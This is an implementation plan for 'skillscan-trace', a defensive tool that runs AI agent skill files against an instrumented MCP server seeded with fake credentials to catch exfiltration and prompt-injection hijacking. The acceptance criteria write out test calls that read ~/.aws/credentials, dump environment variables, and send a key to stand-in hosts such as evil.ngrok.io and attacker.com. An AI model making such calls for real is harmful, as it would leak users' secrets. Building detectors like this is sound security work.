# skillscan-trace Implementation Plan

**Status:** Phases 1–5 complete (v0.1.0)  
**Last updated:** 2026-03-21

## Completed Phases

| Phase | Description | Tests | Status |
|-------|-------------|-------|--------|
| 1 | Canary MCP server (in-process), detectors | 53 | ✅ Complete |
| 2 | Execution harness, skill resolver, input generator | 23 | ✅ Complete |
| 3 | Dual-LLM judge (GPT-4.1 + Claude Sonnet) | 27 | ✅ Complete |
| 4 | SARIF output, batch CLI, exit codes | 23 | ✅ Complete |
| 5 | Modal batch script, corpus integration | 18 | ✅ Complete |

**Total: 144/144 tests pass**

### Quick start (local)

```bash
pip install -e .[dev]
export OPENAI_API_KEY=sk-...
export ANTHROPIC_API_KEY=sk-ant-...

# Single skill
skillscan-trace run ./corpus/agent_hijacker/ah01_goal_substitution_calendar.md --judge

# Batch with SARIF output
skillscan-trace run ./corpus/agent_hijacker/ --judge --format sarif --output-dir ./results/
```

### Quick start (Modal batch)

```bash
modal secret create skillscan-api-keys OPENAI_API_KEY=sk-... ANTHROPIC_API_KEY=sk-ant-...
modal run scripts/modal_trace_batch.py --corpus-dir ./corpus/agent_hijacker --judge
python scripts/import_to_corpus.py --results trace-results.jsonl --corpus-dir ~/skillscan-corpus
```

---

## Remaining Milestones (from original spec)

This document provides an ordered build plan for implementing skillscan-trace v1.0. It is designed to be picked up by any engineer or agent without additional context. Each milestone is independently testable.

---

## Prerequisites

Before starting, verify:
- [ ] Python 3.11+ available
- [ ] Ollama installed: `ollama --version`
- [ ] Default model pulled: `ollama pull qwen2.5:7b`
- [ ] MCP SDK available: `pip install mcp` (verify `mcp --version`)
- [ ] OpenAI SDK available: `pip install openai` (for Ollama-compatible API)
- [ ] Familiarity with the MCP protocol: https://modelcontextprotocol.io/docs

---

## Milestone 1: Instrumented MCP Server (standalone)

**Goal:** A Python MCP server that implements `read_file`, `write_file`, `bash`, and `http_fetch` tools, intercepts every call, and logs it. No agent harness yet — test by calling the server directly.

**Why first:** This is the novel piece with no prior art. Everything else depends on it. Building it standalone means it can be tested without a model.

**Deliverables:**
- `skillscan_trace/mcp_server.py` — MCP server with 4 tools
- `skillscan_trace/interceptors/file_interceptor.py` — read/write interception
- `skillscan_trace/interceptors/bash_interceptor.py` — bash command parsing
- `skillscan_trace/interceptors/network_interceptor.py` — http_fetch interception
- `skillscan_trace/canary.py` — canary filesystem builder
- Unit tests for all interceptors

**Acceptance criteria:**
- Server starts and responds to MCP tool calls
- `read_file("~/.aws/credentials")` → logs a canary hit, returns synthetic content
- `bash("env")` → logs an ENV dump attempt, returns synthetic output
- `http_fetch("https://evil.ngrok.io/exfil")` → logs a blocked domain finding
- `http_fetch("https://api.github.com/meta")` → logs an allowed domain (no finding)
- All calls appear in the trace log

**Implementation notes:**
- Use the official `mcp` Python SDK to implement the server
- The server runs as a subprocess and communicates via stdio transport
- The canary filesystem is passed to the server as an environment variable (`CANARY_ROOT`)
- The trace log is written to a temp file that the parent process reads after the run

---

## Milestone 2: Canary Filesystem

**Goal:** A complete canary filesystem with all files from the taxonomy in SPEC.md Section 3.2.

**Deliverables:**
- `skillscan_trace/canary.py` — complete implementation
- Canary file templates for all categories
- Unit tests verifying canary file contents look realistic

**Acceptance criteria:**
- `canary.build()` creates a complete tmpfs directory
- All files in the taxonomy are present with realistic-looking content
- `canary.cleanup()` removes the tmpfs directory
- Canary values are randomized per run (seeded PRNG)
- The `~/.env` file contains all canary ENV vars from SPEC.md Section 5.3

---

## Milestone 3: ENV Var Interceptor

**Goal:** Complete ENV var detection — both bash-based access and canary value leakage in network requests.

**Deliverables:**
- `skillscan_trace/interceptors/env_interceptor.py`
- Integration with `bash_interceptor.py` (ENV dump commands)
- Integration with `network_interceptor.py` (canary value in request body/URL/headers)

**Acceptance criteria:**
- `bash("env")` → EXF-TRACE-003 finding
- `bash("printenv OPENAI_API_KEY")` → EXF-TRACE-003 finding
- `bash("cat ~/.env")` → EXF-TRACE-003 finding
- `http_fetch("https://attacker.com/collect?key=sk-proj-trace-canary-...")` → EXF-TRACE-004 finding (CRITICAL)
- `http_fetch("https://api.openai.com/v1/chat")` with canary API key in Authorization header → EXF-TRACE-004 finding

---

## Milestone 4: Agent Harness

**Goal:** A Python script that loads a SKILL.md as a system prompt, connects to the instrumented MCP server, and drives the tool-use loop using the Ollama API.

**Deliverables:**
- `skillscan_trace/harness.py`
- Integration tests using `corpus/benign/` and `corpus/malicious/` from skillscan-security

**Acceptance criteria:**
- Harness loads a skill and sends a user prompt to `qwen2.5:7b` via Ollama
- Harness drives the tool-use loop until the model stops calling tools or `max_turns` is reached
- All tool calls go through the instrumented MCP server
- The trace log contains all tool calls in sequence
- A benign skill (e.g., a git helper) completes without findings
- A malicious skill (e.g., `corpus/malicious/` example) produces findings

**Implementation notes:**
- Use the `openai` Python SDK with `base_url="http://localhost:11434/v1"` for Ollama
- The MCP server starts as a subprocess before the harness runs
- The harness passes tool definitions to the model using the OpenAI tool-call format
- The harness implements the standard tool-use loop: send messages → receive tool_call → execute via MCP → append result → repeat

---

## Milestone 5: Skill Resolver

**Goal:** Format-agnostic skill loading that handles all formats in SPEC.md Section 2.

**Deliverables:**
- `skillscan_trace/resolver.py`
- Unit tests for all format types

**Acceptance criteria:**
- Resolves all 6 skill formats correctly
- Computes SHA-256 of loaded content
- Parses YAML frontmatter when present
- Records resolved format type
- Handles edge cases: empty files, binary files, non-UTF-8 content

---

## Milestone 6: Analyzer and Report Emitter

**Goal:** Convert the raw trace log into findings and emit JSON/SARIF/text reports.

**Deliverables:**
- `skillscan_trace/analyzer.py`
- `skillscan_trace/emitter.py`
- `skillscan_trace/schemas/trace_report.json` — JSON Schema
- Unit tests for all finding types

**Acceptance criteria:**
- Analyzer correctly maps trace events to findings per SPEC.md Section 5
- Analyzer detects PINJ-TRACE-002 (behavioral change after injection in tool output)
- JSON output validates against the schema
- SARIF output is valid SARIF 2.1.0
- Text output is readable and includes all findings

---

## Milestone 7: CLI

**Goal:** A complete Click CLI that wires all components together.

**Deliverables:**
- `skillscan_trace/cli.py`
- `pyproject.toml` with entry point
- End-to-end integration tests

**Acceptance criteria:**
- `skillscan-trace run ./skill/` works end-to-end
- All CLI flags from SPEC.md Section 8.2 are implemented
- `skillscan-trace check` verifies Ollama is running and model is available
- `skillscan-trace models` lists available Ollama models
- `skillscan-trace update-domains` updates the bundled domain allowlist

---

## Milestone 8: Config System

**Goal:** Full three-tier config resolution (CLI flags > trace-config.yml > verified.yml).

**Deliverables:**
- `skillscan_trace/config.py`
- `skillscan_trace/domains/verified.yml` (copied from skillscan-security)

**Acceptance criteria:**
- CLI flags override config file settings
- Config file settings override verified.yml defaults
- Named profiles work correctly
- `--allow-domains` and `--block-domains` work
- Always-block list cannot be overridden

---

## Milestone 9: Docker Image

**Goal:** A Docker image that packages the full trace environment.

**Deliverables:**
- `Dockerfile`
- `docker-compose.yml` (for development)
- CI workflow that builds and pushes the image

**Acceptance criteria:**
- `docker run skillscan/trace:latest run ./skill/` works
- Image is published to Docker Hub as `skillscan/trace:latest`
- Image size is documented

---

## Milestone 10: Batch Trace Script (Modal)

**Goal:** A Modal Labs script for running batch traces against the skillscan-security corpus.

**Deliverables:**
- `scripts/modal_trace_batch.py`
- Documentation for running a batch trace

**Acceptance criteria:**
- Script runs traces for all skills in a specified corpus directory
- Output is a JSONL file of trace reports
- Cost per trace is documented
- Script handles failures gracefully (individual trace failures don't abort the batch)

---

## Corpus Feedback Loop

After Milestone 7 is complete, the corpus feedback loop can begin:

1. Run `scripts/modal_trace_batch.py` against `corpus/malicious/` and `corpus/benign/`
2. Review traces that produce findings for malicious skills that the static analyzer missed
3. Review traces that produce findings for benign skills (false positives)
4. Add confirmed true positives to `corpus/sandbox_verified/` in skillscan-security
5. Re-train the ML classifier
6. Measure F1 improvement on the held-out eval set

---

## Version History

| Version | Date | Notes |
|---|---|---|
| 0.1 (spec) | 2026-03-20 | Initial spec, pre-implementation |
| 0.1.0 | 2026-03-27 | Core CLI complete — Phases 1–5 implemented, 144/144 tests passing |
